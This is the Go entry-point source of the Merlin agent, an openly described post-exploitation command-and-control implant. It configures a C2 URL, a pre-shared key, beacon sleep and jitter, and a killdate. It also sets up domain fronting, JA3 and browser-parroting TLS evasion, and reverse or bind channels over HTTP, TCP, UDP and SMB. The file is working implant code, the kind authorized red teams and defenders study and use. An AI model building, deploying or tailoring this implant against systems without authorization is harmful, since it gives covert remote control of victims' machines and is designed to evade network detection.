/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package main

import (
	// Standard
	"bufio"
	"flag"
	"fmt"
	"io"
	"os"
	"strconv"
	"strings"
	"time"

	// 3rd Party
	"github.com/fatih/color"
	"github.com/google/shlex"
	"github.com/google/uuid"

	"github.com/Ne0nd0g/merlin-agent/v2/agent"
	"github.com/Ne0nd0g/merlin-agent/v2/clients"
	"github.com/Ne0nd0g/merlin-agent/v2/clients/http"
	"github.com/Ne0nd0g/merlin-agent/v2/clients/smb"
	"github.com/Ne0nd0g/merlin-agent/v2/clients/tcp"
	"github.com/Ne0nd0g/merlin-agent/v2/clients/udp"
	"github.com/Ne0nd0g/merlin-agent/v2/core"
	"github.com/Ne0nd0g/merlin-agent/v2/run"
)

// GLOBAL VARIABLES
// These are use hard code configurable options during compile time with Go's ldflags -X option

// auth the authentication method the Agent will use to authenticate to the server
var auth = "opaque"

// addr is the interface and port the agent will use for network connections
var addr = "127.0.0.1:7777"

// headers is a list of HTTP headers that the agent will use with the HTTP protocol to communicate with the server
var headers = ""

// host a specific HTTP header used with HTTP communications; notably used for domain fronting
var host = ""

// httpClient is a string that represents what type of HTTP client the Agent should use (e.g., winhttp, go)
var httpClient = "go"

// ja3 a string that represents how the Agent should configure it TLS client
var ja3 = ""

// killdate the date and time, as a unix epoch timestamp, that the agent will quit running
var killdate = "0"

// listener the UUID of the peer-to-peer listener this agent belongs to, used with delegate messages
var listener = ""

// maxretry the number of failed connections to the server before the agent will quit running
var maxretry = "7"

// opaque the EnvU data from OPAQUE registration so the agent can skip straight to authentication
var opaque []byte

// padding the maximum size for random amounts of data appended to all messages to prevent static message sizes
var padding = "4096"

// parrot a string from the https://github.com/refraction-networking/utls#parroting library to mimic a specific browser
var parrot = ""

// protocol the communication protocol the agent will use to communicate with the server
var protocol = "h2"

// proxy the address of HTTP proxy to send HTTP traffic through
var proxy = ""

// proxyUser the username for proxy authentication
var proxyUser = ""

// proxyPass the password for proxy authentication
var proxyPass = ""

// psk is the Pre-Shared Key, the secret used to encrypt messages communications with the server
var psk = "merlin"

// secure a boolean value as a string that determines the value of the TLS InsecureSkipVerify option for HTTP
// communications.
// Must be a string, so it can be set from the Makefile
var secure = "false"

// sleep the amount of time the agent will sleep before it attempts to check in with the server
var sleep = "30s"

// skew the maximum size for random amounts of time to add to the sleep value to vary checkin times
var skew = "3000"

// transforms is an ordered comma seperated list of transforms (encoding/encryption) to apply when constructing a message
// that will be sent to the server
var transforms = "jwe,gob-base"

// url the protocol, address, and port of the Agent's command and control server to communicate with
var url = "https://127.0.0.1:443"

// useragent the HTTP User-Agent header for HTTP communications
var useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"

func main() {
	verbose := flag.Bool("v", false, "Enable verbose output")
	version := flag.Bool("version", false, "Print the agent version and exit")
	debug := flag.Bool("debug", false, "Enable debug output")
	flag.StringVar(&auth, "auth", auth, "The Agent's authentication method (e.g, OPAQUE")
	flag.StringVar(&addr, "addr", addr, "The address in interface:port format the agent will use for communications")
	flag.StringVar(&transforms, "transforms", transforms, "Ordered CSV of transforms to construct a message")
	flag.StringVar(&url, "url", url, "A comma separated list of the full URLs for the agent to connect to")
	flag.StringVar(&psk, "psk", psk, "Pre-Shared Key used to encrypt initial communications")
	flag.StringVar(&protocol, "proto", protocol, "Protocol for the agent to connect with [https (HTTP/1.1), http (HTTP/1.1 Clear-Text), h2 (HTTP/2), h2c (HTTP/2 Clear-Text), http3 (QUIC or HTTP/3.0), tcp-bind, tcp-reverse, udp-bind, udp-reverse, smb-bind, smb-reverse]")
	flag.StringVar(&proxy, "proxy", proxy, "Hardcoded proxy to use for http/1.1 traffic only that will override host configuration")
	flag.StringVar(&proxyUser, "proxy-user", proxyUser, "Username for proxy authentication")
	flag.StringVar(&proxyPass, "proxy-pass", proxyPass, "Password for proxy authentication")
	flag.StringVar(&host, "host", host, "HTTP Host header")
	flag.StringVar(&ja3, "ja3", ja3, "JA3 signature string (not the MD5 hash). Overrides -proto & -parrot flags")
	flag.StringVar(&parrot, "parrot", ja3, "parrot or mimic a specific browser from github.com/refraction-networking/utls (e.g., HelloChrome_Auto)")
	flag.StringVar(&secure, "secure", secure, "Require TLS certificate validation for HTTP communications")
	flag.StringVar(&sleep, "sleep", sleep, "Time for agent to sleep")
	flag.StringVar(&skew, "skew", skew, "Amount of skew, or variance, between agent checkins")
	flag.StringVar(&killdate, "killdate", killdate, "The date, as a Unix EPOCH timestamp, that the agent will quit running")
	flag.StringVar(&listener, "listener", listener, "The uuid of the peer-to-peer listener this agent should connect to")
	flag.StringVar(&maxretry, "maxretry", maxretry, "The maximum amount of failed checkins before the agent will quit running")
	flag.StringVar(&padding, "padding", padding, "The maximum amount of data that will be randomly selected and appended to every message")
	flag.StringVar(&useragent, "useragent", useragent, "The HTTP User-Agent header string that the Agent will use while sending traffic")
	flag.StringVar(&headers, "headers", headers, "A new line separated (e.g., \\n) list of additional HTTP headers to use")
	flag.StringVar(&httpClient, "http-client", httpClient, "The HTTP client to use for communication [go, winhttp]")

	flag.Usage = usage

	if len(os.Args) <= 1 {
		input := make(chan string, 1)
		var stdin string
		go getArgsFromStdIn(input, *verbose)

		select {
		case i := <-input:
			stdin = i
		case <-time.After(500 * time.Millisecond):
		}
		if stdin != "" {
			args, err := shlex.Split(stdin)
			if err == nil && len(args) > 0 {
				os.Args = append(os.Args, args...)
			}
		}
	}
	flag.Parse()

	if *version {
		color.Blue(fmt.Sprintf("Merlin Agent Version: %s", core.Version))
		color.Blue(fmt.Sprintf("Merlin Agent Build: %s", core.Build))
		os.Exit(0)
	}

	core.Debug = *debug
	core.Verbose = *verbose

	// Setup and run agent
	agentConfig := agent.Config{
		Sleep:    sleep,
		Skew:     skew,
		KillDate: killdate,
		MaxRetry: maxretry,
	}
	a, err := agent.New(agentConfig)
	if err != nil {
		if *verbose {
			color.Red(err.Error())
		}
		os.Exit(1)
	}

	// Parse the secure flag
	var verify bool
	verify, err = strconv.ParseBool(secure)
	if err != nil {
		if *verbose {
			color.Red(err.Error())
		}
		os.Exit(1)
	}

	// Get the client
	var client clients.Client
	var listenerID uuid.UUID
	switch protocol {
	case "http", "https", "h2", "h2c", "http3":
		clientConfig := http.Config{
			AgentID:      a.ID(),
			Protocol:     protocol,
			ClientType:   httpClient,
			Host:         host,
			Headers:      headers,
			Proxy:        proxy,
			ProxyUser:    proxyUser,
			ProxyPass:    proxyPass,
			UserAgent:    useragent,
			PSK:          psk,
			JA3:          ja3,
			Parrot:       parrot,
			Padding:      padding,
			AuthPackage:  auth,
			Opaque:       opaque,
			Transformers: transforms,
			InsecureTLS:  !verify,
		}

		if strings.ToLower(httpClient) == "winhttp" && strings.ToLower(protocol) == "h2" {
			clientConfig.Protocol = "https"
		}

		if url != "" {
			clientConfig.URL = strings.Split(strings.ReplaceAll(url, " ", ""), ",")
		}

		client, err = http.New(clientConfig)
		if err != nil {
			if *verbose {
				color.Red(err.Error())
			}
			os.Exit(1)
		}
	case "tcp-bind", "tcp-reverse":
		listenerID, err = uuid.Parse(listener)
		if err != nil {
			if *verbose {
				color.Red(fmt.Sprintf("there was an error parsing the listener's UUID: %s", err))
			}
			os.Exit(1)
		}
		config := tcp.Config{
			AgentID:      a.ID(),
			ListenerID:   listenerID,
			PSK:          psk,
			Address:      []string{addr},
			AuthPackage:  auth,
			Transformers: transforms,
			Mode:         protocol,
			Padding:      padding,
		}

		// Get the client
		client, err = tcp.New(config)
		if err != nil {
			if *verbose {
				color.Red(err.Error())
			}
			os.Exit(1)
		}
	case "udp-bind", "udp-reverse":
		listenerID, err = uuid.Parse(listener)
		if err != nil {
			if *verbose {
				color.Red(fmt.Sprintf("there was an error parsing the listener's UUID: %s", err))
			}
			os.Exit(1)
		}
		config := udp.Config{
			AgentID:      a.ID(),
			ListenerID:   listenerID,
			PSK:          psk,
			Address:      []string{addr},
			AuthPackage:  auth,
			Transformers: transforms,
			Mode:         protocol,
			Padding:      padding,
		}

		// Get the client
		client, err = udp.New(config)
		if err != nil {
			if *verbose {
				color.Red(err.Error())
			}
			os.Exit(1)
		}
	case "smb-bind", "smb-reverse":
		listenerID, err = uuid.Parse(listener)
		if err != nil {
			if *verbose {
				color.Red(fmt.Sprintf("there was an error parsing the listener's UUID: %s", err))
			}
			os.Exit(1)
		}
		config := smb.Config{
			Address:      []string{addr},
			AgentID:      a.ID(),
			AuthPackage:  auth,
			ListenerID:   listenerID,
			Padding:      padding,
			PSK:          psk,
			Transformers: transforms,
			Mode:         protocol,
		}
		// Get the client
		client, err = smb.New(config)
		if err != nil {
			if *verbose {
				color.Red(err.Error())
			}
			os.Exit(1)
		}
	default:
		if *verbose {
			color.Red(fmt.Sprintf("main: unhandled protocol %s\n", protocol))
			os.Exit(1)
		}
	}

	// Start the agent
	run.Run(a, client)
}

// usage prints command line options
func usage() {
	fmt.Printf("Merlin Agent\r\n")
	flag.PrintDefaults()
	os.Exit(0)
}

// getArgsFromStdIn reads merlin agent command line arguments from STDIN so that they can be piped in
func getArgsFromStdIn(input chan string, verbose bool) {
	defer close(input)
	for {
		result, err := bufio.NewReader(os.Stdin).ReadString('\n')
		if err != nil && err != io.EOF {
			if verbose {
				color.Red(fmt.Sprintf("there was an error reading from STDIN: %s", err))
			}
			return
		}
		input <- result
	}
}
